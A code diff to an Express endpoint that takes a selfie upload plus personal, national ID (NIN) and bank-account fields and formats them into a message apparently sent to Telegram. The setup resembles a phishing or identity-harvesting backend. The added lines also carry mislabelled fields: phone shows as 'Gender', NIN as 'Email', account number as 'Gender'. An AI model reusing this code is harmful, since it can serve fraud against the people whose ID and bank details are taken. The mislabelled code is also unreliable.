@@ -109,26 +109,41 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
         const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
+const nameLine = name ? `<b>Name:</b> ${name}` : '';
+const genderLine = gender ? `<b>Gender:</b> ${gender}` : '';
+const dobLine = dob ? `<b>Date of Birth:</b> ${dob}` : '';
+const emailLine = email ? `<b>Email:</b> ${email}` : '';
+const employLine = employ ? `<b>Name:</b> ${employ}` : '';
+const phoneLine = phone ? `<b>Gender:</b> ${phone}` : '';
+const maritalLine = marital ? `<b>Date of Birth:</b> ${marital}` : '';
+const cityLine = city ? `<b>Email:</b> ${city}` : '';
+const stateLine = state ? `<b>Name:</b> ${state}` : '';
+const addressLine = address ? `<b>Gender:</b> ${address}` : '';
+const lgaLine = lga ? `<b>Date of Birth:</b> ${lga}` : '';
+const ninLine = nin ? `<b>Email:</b> ${nin}` : '';
+const bankNameLine = bankName ? `<b>Name:</b> ${bankName}` : '';
+const accountNumberLine = accountNumber ? `<b>Gender:</b> ${accountNumber}` : '';
+const accountNameLine = accountName ? `<b>Date of Birth:</b> ${accountName}` : '';
 
         // Format text data for Telegram
         const formattedText = `
 📋 <b>New Form Submission</b>
 
- <b>Name:</b> ${name}
- <b>Gender:</b> ${gender}
- <b>Date of Birth:</b> ${dob}
- <b>Email:</b> ${email}
- <b>Employment Status:</b> ${employ}
- <b>Phone:</b> ${phone}
- <b>Marital Status:</b> ${marital}
- <b>City:</b> ${city}
- <b>State:</b> ${state}
- <b>Address:</b> ${address}
- <b>Local Government:</b> ${lga}
- <b>NIN:</b> ${nin}
- <b>Bank Name:</b> ${bankName}
- <b>Account Number:</b> ${accountNumber}
- <b>Account Name:</b> ${accountName}
+ ${nameLine}
+ ${genderLine}
+ ${dobLine}
+ ${emailLine}
+ ${employLine}
+ ${phoneLine}
+ ${maritalLine}
+ ${cityLine}
+ ${stateLine}
+ ${addressLine}
+ ${lgaLine}
+ ${ninLine}
+ ${bankNameLine}
+ ${accountNumberLine}
+ ${accountNameLine}
 
 🕒 <b>Submitted at:</b> ${new Date().toLocaleString()}
         `.trim();
